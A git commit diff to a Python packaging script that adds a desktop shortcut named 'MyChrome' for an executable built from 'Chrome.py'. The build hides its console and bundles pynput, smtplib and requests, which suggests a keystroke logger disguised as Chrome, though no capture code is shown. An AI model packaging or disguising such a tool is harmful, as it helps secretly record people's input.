f10a266c141a67e6faebb362934bab8b3757b1c1
Andrii Trofimchuk <trofimchuk.an@gmail.com>
2021-02-14 15:44:54 +0200

    Add shurtcut

--- setup.py
+++ setup.py
@@ -8,7 +8,8 @@ if (sys.platform == "win32"):
     base = "Win32GUI"
 
 
-executables = [Executable("Chrome.py", base=base, icon="icon.ico")]
+executables = [Executable("Chrome.py", base=base, icon="icon.ico", shortcutName="MyChrome",
+            shortcutDir="DesktopFolder",)]
 
 packages = ["idna", "pynput", "threading", "smtplib", "time", "requests"]
 options = {
